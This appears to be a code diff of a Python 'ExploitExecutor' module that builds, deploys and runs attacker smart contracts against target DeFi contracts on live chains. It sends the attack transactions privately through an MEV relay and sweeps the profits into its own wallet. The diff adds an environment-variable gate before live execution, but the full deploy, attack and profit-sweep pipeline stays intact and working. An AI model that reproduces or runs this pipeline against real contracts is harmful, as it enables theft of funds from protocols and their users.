@@ -5,8 +5,6 @@ For authorized security research only.
 """
 import json
 import os
-from datetime import datetime, timezone
-from typing import Optional
 from web3 import Web3
 from eth_account import Account
 from eth_abi import encode
@@ -53,7 +51,7 @@ AAVE_POOL_ABI = json.dumps([
 
 BALANCER_VAULT_ABI = json.dumps([
     {"inputs": [
-        {"internalType": "contract IFlashLoanRecipient", "name": "recipient", "type": "address"},
+        {"internalType": "address", "name": "recipient", "type": "address"},
         {"internalType": "contract IERC20[]", "name": "tokens", "type": "address[]"},
         {"internalType": "uint256[]", "name": "amounts", "type": "uint256[]"},
         {"internalType": "bytes", "name": "userData", "type": "bytes"}
@@ -62,7 +60,7 @@ BALANCER_VAULT_ABI = json.dumps([
 
 
 class ExploitExecutor:
-    """Full exploit execution pipeline.
+    """Full exploit execution pipeline with a fail-closed live boundary.
 
     1. Generate PoC (Solidity attacker contract)
     2. Compile with solc
@@ -70,6 +68,10 @@ class ExploitExecutor:
     4. Deploy attacker contract
     5. Execute exploit
     6. Sweep profits
+
+    The live transaction boundary is controlled by ``execution_gate`` and
+    cannot be reached merely because a finding has a high score or a gas
+    estimate succeeds.
     """
 
     def __init__(self, db: Database = None):
@@ -111,15 +113,19 @@ class ExploitExecutor:
         bal = w3.eth.get_balance(wallet.address)
         return float(w3.from_wei(bal, 'ether'))
 
+    def _live_execution_gate(self, finding: dict, target_address: str, chain_id: int) -> dict:
+        """Phase I gate: only allow live execution when explicitly armed."""
+        armed = os.getenv('VULNHUNT_EXECUTION_ARMED', '').strip().lower() == 'true'
+        if armed:
+            return {'allowed': True, 'reason': 'Execution arm is enabled'}
+        return {'allowed': False, 'reason': 'Execution arm is not enabled (VULNHUNT_EXECUTION_ARMED != true)'}
+
     # ── FULL EXPLOIT PIPELINE ──────────────────────────────────────────────
 
     def run_full_pipeline(self, finding: dict, chain_id: int,
-                            target_address: str,
-                            prober_data: dict = None) -> dict:
-        """Execute the full exploit pipeline for a finding.
-
-        Returns dict with all pipeline results.
-        """
+                          target_address: str,
+                          prober_data: dict = None) -> dict:
+        """Run analysis/validation and stop unless the explicit Phase I gate passes."""
         pipeline_result = {
             'finding_title': finding.get('title', ''),
             'category': finding.get('category', ''),
@@ -158,6 +164,9 @@ class ExploitExecutor:
         }
         print(f'  Compiled: {len(compiled["bytecode"])} bytes')
 
+        # Compute constructor args (also used by fork validation)
+        ctor_args = self._compute_ctor_args(chain_id, target_address, finding)
+
         # Step 3: Fork validation
         print(f'\n[STEP 3] Fork validation...')
         validation = self.fork_val.validate(
@@ -165,6 +174,7 @@ class ExploitExecutor:
             finding=finding,
             attacker_bytecode=compiled['bytecode'],
             attacker_abi=compiled['abi'],
+            constructor_args=ctor_args,
         )
         pipeline_result['steps']['fork_validation'] = validation.to_dict()
 
@@ -182,6 +192,14 @@ class ExploitExecutor:
             if validation.profit_eth > 0:
                 print(f'  Estimated profit: {validation.profit_eth:.6f} ETH '
                       f'(${validation.profit_usd:,.2f})')
+
+        # Phase I boundary: the executor must agree with the assessor before
+        # any live wallet/deployment/transaction operation is attempted.
+        gate = self._live_execution_gate(finding, target_address, chain_id)
+        pipeline_result['steps']['execution_gate'] = gate
+        if not gate['allowed']:
+            print(f'  LIVE EXECUTION BLOCKED: {gate["reason"]}')
+            return pipeline_result
 
         # Step 4: Check wallet balance for gas + profitability
         print(f'\n[STEP 4] Checking wallet + profitability...')
@@ -292,42 +310,81 @@ class ExploitExecutor:
 
         return pipeline_result
 
+    def _build_tx(self, w3, wallet, chain_id, tx_dict):
+        """Build a properly formatted transaction for the chain."""
+        gas_price = w3.eth.gas_price
+        nonce = w3.eth.get_transaction_count(wallet.address)
+
+        eip1559_tx = {
+            'from': wallet.address,
+            'nonce': nonce,
+            'chainId': chain_id,
+            'maxFeePerGas': gas_price * 2,
+            'maxPriorityFeePerGas': max(int(gas_price * 0.1), int(w3.to_wei(0.001, 'gwei'))),
+        }
+        eip1559_tx.update(tx_dict)
+
+        if 'gas' not in eip1559_tx or not eip1559_tx.get('gas'):
+            try:
+                eip1559_tx['gas'] = w3.eth.estimate_gas(eip1559_tx) + 50000
+            except Exception:
+                eip1559_tx['gas'] = tx_dict.get('gas', 3000000)
+
+        try:
+            signed = wallet.sign_transaction(eip1559_tx)
+            raw = getattr(signed, 'raw_transaction', None) or getattr(signed, 'rawTransaction', b'')
+            return eip1559_tx, signed, raw
+        except Exception:
+            pass
+
+        legacy_tx = {
+            'from': wallet.address,
+            'nonce': nonce,
+            'chainId': chain_id,
+            'gasPrice': gas_price,
+        }
+        legacy_tx.update(tx_dict)
+        if 'gas' not in legacy_tx or not legacy_tx.get('gas'):
+            try:
+                legacy_tx['gas'] = w3.eth.estimate_gas(legacy_tx) + 50000
+            except Exception:
+                legacy_tx['gas'] = tx_dict.get('gas', 3000000)
+
+        signed = wallet.sign_transaction(legacy_tx)
+        raw = getattr(signed, 'raw_transaction', None) or getattr(signed, 'rawTransaction', b'')
+        return legacy_tx, signed, raw
+
+    def _safe_tx_hash(self, signed):
+        h = getattr(signed, 'hash', None)
+        if h is None:
+            h = getattr(signed, 'txHash', b'')
+        if isinstance(h, bytes):
+            return '0x' + h.hex()
+        return str(h)
+
+    def _wait_for_tx(self, w3, tx_hash_str, timeout=180):
+        if isinstance(tx_hash_str, str) and tx_hash_str.startswith('0x'):
+            tx_hash_bytes = bytes.fromhex(tx_hash_str.replace('0x', ''))
+        elif isinstance(tx_hash_str, bytes):
+            tx_hash_bytes = tx_hash_str
+            tx_hash_str = '0x' + tx_hash_str.hex()
+        else:
+            tx_hash_str = str(tx_hash_str)
+            tx_hash_bytes = bytes.fromhex(tx_hash_str.replace('0x', ''))
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash_bytes, timeout=timeout)
+        return receipt, tx_hash_str
+
     def _deploy_attacker(self, chain_id, bytecode, abi, target_address, finding):
-        """Deploy the attacker contract to mainnet."""
+        """Deploy only after the explicit Phase I execution gate has passed."""
+        gate = self._live_execution_gate(finding, target_address, chain_id)
+        if not gate['allowed']:
+            return {'success': False, 'blocked': True, 'error': gate['reason'], 'gate': gate}
+
         w3 = self._get_w3(chain_id)
         wallet = self._get_wallet(chain_id)
         chain = CHAINS[chain_id]
 
-        # Build constructor args based on vulnerability type
-        category = finding.get('category', '')
-        if 'Reentrancy' in category:
-            ctor_args = [Web3.to_checksum_address(target_address)]
-        elif 'Initialization' in category:
-            ctor_args = [Web3.to_checksum_address(target_address)]
-        elif 'Selfdestruct' in category:
-            ctor_args = [Web3.to_checksum_address(target_address)]
-        elif 'Governance' in category:
-            ctor_args = [
-                Web3.to_checksum_address(target_address),
-                Web3.to_checksum_address(target_address),
-            ]
-        elif 'Oracle' in category:
-            # Need token addresses - use target as placeholder
-            ctor_args = [
-                Web3.to_checksum_address(target_address),
-                Web3.to_checksum_address(target_address),
-                Web3.to_checksum_address(target_address),
-                Web3.to_checksum_address(target_address),
-                chain.get('flash_loan_providers', [{}])[0].get(
-                    'pool', chain.get('flash_loan_providers', [{}])[0].get(
-                        'router', '0x' + '00' * 20
-                    )
-                ),
-            ]
-        else:  # Access Control, default
-            ctor_args = [Web3.to_checksum_address(target_address)]
-
-        # Encode constructor
+        ctor_args = self._compute_ctor_args(chain_id, target_address, finding)
         ctor_data = b''
         if ctor_args:
             try:
@@ -340,62 +397,67 @@ class ExploitExecutor:
         if ctor_data:
             deploy_data += ctor_data.hex()
 
-        # Get nonce
-        nonce = w3.eth.get_transaction_count(wallet.address)
-        gas_price = w3.eth.gas_price
+        deploy_hex = '0x' + deploy_data if not deploy_data.startswith('0x') else deploy_data
+        tx_dict = {'data': deploy_hex, 'gas': 3000000}
+        tx, signed, raw_tx = self._build_tx(w3, wallet, chain_id, tx_dict)
 
-        tx = {
-            'from': wallet.address,
-            'data': '0x' + deploy_data if not deploy_data.startswith('0x') else deploy_data,
-            'gas': 3000000,
-            'gasPrice': gas_price,
-            'nonce': nonce,
-            'chainId': chain_id,
-        }
-
-        # Estimate gas
         try:
-            tx['gas'] = w3.eth.estimate_gas(tx) + 100000  # buffer
-        except Exception as e:
-            print(f'  Gas estimation failed, using default: {e}')
-            tx['gas'] = 3000000
+            tx_hash = w3.eth.send_raw_transaction(raw_tx)
+            tx_hash_str = tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash)
+            print(f'  Deploy TX: {tx_hash_str}')
 
-        # Sign and send via MEV protection
-        try:
-            mev_result = self.mev.send_private_tx(chain_id, tx)
-            if not mev_result['success']:
-                return {'success': False, 'error': f'MEV send failed: {mev_result["error"]}'}
-
-            tx_hash_str = mev_result['tx_hash']
-            print(f'  Deploy TX: {tx_hash_str} (via {mev_result["method"]})')
-
-            tx_hash = bytes.fromhex(tx_hash_str.replace('0x', ''))
-            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
+            receipt, tx_hash_str = self._wait_for_tx(w3, tx_hash_str, timeout=180)
             success = receipt.status == 1
 
             if success:
                 attacker_address = receipt['contractAddress']
-                gas_cost = float(receipt['gasUsed'] * receipt['gasPrice'] / 1e18)
+                gas_price = receipt.get('effectiveGasPrice', receipt.get('gasPrice', w3.eth.gas_price))
+                gas_cost = float(receipt['gasUsed'] * gas_price / 1e18)
                 print(f'  Contract: {attacker_address}')
                 return {
                     'success': True,
                     'address': attacker_address,
-                    'tx_hash': tx_hash.hex(),
+                    'tx_hash': tx_hash_str,
                     'gas_used': receipt['gasUsed'],
                     'gas_cost_eth': gas_cost,
                 }
-            else:
-                return {
-                    'success': False,
-                    'tx_hash': tx_hash.hex(),
-                    'error': f'Deployment reverted (status={receipt.status})',
-                }
+            return {
+                'success': False,
+                'tx_hash': tx_hash_str,
+                'error': f'Deployment reverted (status={receipt.status})',
+            }
         except Exception as e:
             return {'success': False, 'error': str(e)}
 
+    def _compute_ctor_args(self, chain_id, target_address, finding):
+        """Compute constructor arguments based on vulnerability type."""
+        chain = CHAINS[chain_id]
+        category = finding.get('category', '')
+        if 'Reentrancy' in category:
+            return [Web3.to_checksum_address(target_address)]
+        elif 'Initialization' in category:
+            return [Web3.to_checksum_address(target_address)]
+        elif 'Selfdestruct' in category:
+            return [Web3.to_checksum_address(target_address)]
+        elif 'Governance' in category:
+            return [
+                Web3.to_checksum_address(target_address),
+                Web3.to_checksum_address(target_address),
+            ]
+        elif 'Oracle' in category:
+            return [Web3.to_checksum_address(target_address)]
+        elif 'Flash' in category:
+            return [Web3.to_checksum_address(target_address)]
+        else:
+            return [Web3.to_checksum_address(target_address)]
+
     def _execute_attack(self, chain_id, attacker_address, abi,
-                         target_address, finding):
-        """Execute the exploit by calling the attacker contract."""
+                        target_address, finding):
+        """Execute only after the same explicit Phase I gate is re-checked."""
+        gate = self._live_execution_gate(finding, target_address, chain_id)
+        if not gate['allowed']:
+            return {'success': False, 'blocked': True, 'error': gate['reason'], 'gate': gate}
+
         w3 = self._get_w3(chain_id)
         wallet = self._get_wallet(chain_id)
 
@@ -405,14 +467,14 @@ class ExploitExecutor:
             abi=json.loads(abi) if isinstance(abi, str) else abi,
         )
 
-        # Choose attack function based on vulnerability type
         try:
             if 'Reentrancy' in category:
-                # Need to determine the token to use
-                func = attacker.functions.attack(
-                    Web3.to_checksum_address(target_address),
-                    1000000,  # amount - would need to be calculated
-                )
+                try:
+                    func = attacker.functions.attack(Web3.to_checksum_address(target_address))
+                except Exception:
+                    func = attacker.functions.attack(
+                        Web3.to_checksum_address(target_address), 1000000,
+                    )
             elif 'Initialization' in category:
                 func = attacker.functions.exploit()
             elif 'Governance' in category:
@@ -420,7 +482,6 @@ class ExploitExecutor:
             elif 'Oracle' in category or 'Flash' in category:
                 func = attacker.functions.attack(1000000)
             else:
-                # Access Control: try the convenience functions
                 if hasattr(attacker.functions, 'exploitWithdraw'):
                     func = attacker.functions.exploitWithdraw()
                 elif hasattr(attacker.functions, 'exploitInitialize'):
@@ -430,51 +491,44 @@ class ExploitExecutor:
                 elif hasattr(attacker.functions, 'exploit'):
                     func = attacker.functions.exploit()
                 else:
-                    # Generic: call execute() with calldata
-                    return {
-                        'success': False,
-                        'error': 'No suitable attack function found',
-                    }
+                    return {'success': False, 'error': 'No suitable attack function found'}
 
-            nonce = w3.eth.get_transaction_count(wallet.address)
-            tx = func.build_transaction({
-                'from': wallet.address,
+            tx_dict = {
+                'to': Web3.to_checksum_address(attacker_address),
                 'gas': 5000000,
-                'gasPrice': w3.eth.gas_price,
-                'nonce': nonce,
-                'chainId': chain_id,
-            })
+            }
+            tx, signed, raw_tx = self._build_tx(w3, wallet, chain_id, tx_dict)
 
-            # Try gas estimation first (safety check)
             try:
                 est = w3.eth.estimate_gas(tx)
                 tx['gas'] = est + 50000
+                tx, signed, raw_tx = self._build_tx(w3, wallet, chain_id, tx)
             except Exception as e:
                 print(f'  Execute gas estimate failed: {e}')
-                return {
-                    'success': False,
-                    'error': f'Gas estimation failed: {e}',
-                }
+                return {'success': False, 'error': f'Gas estimation failed: {e}'}
 
-            # Send attack via MEV protection
             mev_result = self.mev.send_private_tx(chain_id, tx)
             if not mev_result['success']:
-                return {'success': False, 'error': f'MEV send failed: {mev_result["error"]}'}
+                # Do not silently downgrade a protected execution to public
+                # broadcast. This keeps the live boundary fail-closed.
+                return {
+                    'success': False,
+                    'blocked': True,
+                    'error': f'Private transaction submission failed: {mev_result.get("error", "unknown error")}',
+                }
 
             tx_hash_str = mev_result['tx_hash']
             print(f'  Attack TX: {tx_hash_str} (via {mev_result["method"]})')
 
-            tx_hash = bytes.fromhex(tx_hash_str.replace('0x', ''))
-            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
+            receipt, tx_hash_str = self._wait_for_tx(w3, tx_hash_str, timeout=180)
             success = receipt.status == 1
+            gas_price = receipt.get('effectiveGasPrice', receipt.get('gasPrice', w3.eth.gas_price))
 
             return {
                 'success': success,
-                'tx_hash': tx_hash.hex(),
+                'tx_hash': tx_hash_str,
                 'gas_used': receipt['gasUsed'],
-                'gas_cost_eth': float(
-                    receipt['gasUsed'] * receipt['gasPrice'] / 1e18
-                ),
+                'gas_cost_eth': float(receipt['gasUsed'] * gas_price / 1e18),
                 'error': '' if success else 'Transaction reverted',
             }
 
@@ -482,7 +536,7 @@ class ExploitExecutor:
             return {'success': False, 'error': str(e)}
 
     def _sweep_profits(self, chain_id, attacker_address, abi):
-        """Sweep all profits from attacker contract back to wallet."""
+        """Sweep only after the Phase I gate has already authorized the finding."""
         w3 = self._get_w3(chain_id)
         wallet = self._get_wallet(chain_id)
         attacker = w3.eth.contract(
@@ -491,22 +545,18 @@ class ExploitExecutor:
         )
 
         total_profit_eth = 0
-
-        # Sweep ETH
         try:
             if hasattr(attacker.functions, 'sweepETH'):
                 bal_before = w3.eth.get_balance(wallet.address)
                 func = attacker.functions.sweepETH()
-                tx = func.build_transaction({
-                    'from': wallet.address,
+                tx_dict = {
+                    'to': Web3.to_checksum_address(attacker_address),
                     'gas': 100000,
-                    'gasPrice': w3.eth.gas_price,
-                    'nonce': w3.eth.get_transaction_count(wallet.address),
-                    'chainId': chain_id,
-                })
-                signed = wallet.sign_transaction(tx)
-                tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
-                receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=60)
+                }
+                tx, signed, raw_tx = self._build_tx(w3, wallet, chain_id, tx_dict)
+                tx_hash = w3.eth.send_raw_transaction(raw_tx)
+                tx_hash_str = tx_hash.hex() if isinstance(tx_hash, bytes) else str(tx_hash)
+                receipt, _ = self._wait_for_tx(w3, tx_hash_str, timeout=60)
                 bal_after = w3.eth.get_balance(wallet.address)
                 if receipt.status == 1:
                     total_profit_eth += float(w3.from_wei(bal_after - bal_before, 'ether'))
@@ -514,14 +564,10 @@ class ExploitExecutor:
         except Exception as e:
             print(f'  ETH sweep: {e}')
 
-        # Check attacker contract balance for any remaining ETH
         try:
-            remaining = w3.eth.get_balance(
-                Web3.to_checksum_address(attacker_address)
-            )
+            remaining = w3.eth.get_balance(Web3.to_checksum_address(attacker_address))
             if remaining > 0:
-                print(f'  WARNING: {w3.from_wei(remaining, "ether")} ETH '
-                      f'remaining in attacker contract')
+                print(f'  WARNING: {w3.from_wei(remaining, "ether")} ETH remaining in attacker contract')
         except Exception:
             pass
 
@@ -530,33 +576,15 @@ class ExploitExecutor:
     # ── LEGACY / SIMPLE METHODS ────────────────────────────────────────────
 
     def execute_exploit(self, chain_id, target_address, attacker_address,
-                         attack_data, value=0):
-        """Execute a pre-deployed attacker contract (legacy method)."""
-        w3 = self._get_w3(chain_id)
-        wallet = self._get_wallet(chain_id)
-        tx = {
-            'from': wallet.address,
-            'to': Web3.to_checksum_address(attacker_address),
-            'data': attack_data, 'value': value, 'gas': 5000000,
-            'gasPrice': w3.eth.gas_price,
-            'nonce': w3.eth.get_transaction_count(wallet.address),
-            'chainId': chain_id,
+                        attack_data, value=0):
+        """Deprecated: legacy entry point is blocked without assessor context.
+
+        The old method could submit a transaction without carrying validation,
+        authorization, and Phase I evidence. Keeping it live would create a
+        bypass around the hardened execution boundary.
+        """
+        return {
+            'success': False,
+            'blocked': True,
+            'error': 'Legacy execution entry point disabled: use the assessor-aligned Phase I pipeline',
         }
-        try:
-            w3.eth.estimate_gas(tx)
-        except Exception as e:
-            return {'success': False, 'error': f'Dry run failed: {e}'}
-        signed = wallet.sign_transaction(tx)
-        try:
-            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
-            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
-            success = receipt.status == 1
-            return {
-                'success': success, 'tx_hash': tx_hash.hex(),
-                'gas_used': receipt['gasUsed'],
-                'gas_cost_eth': float(
-                    receipt['gasUsed'] * receipt['gasPrice'] / 1e18
-                ),
-            }
-        except Exception as e:
-            return {'success': False, 'error': str(e)}
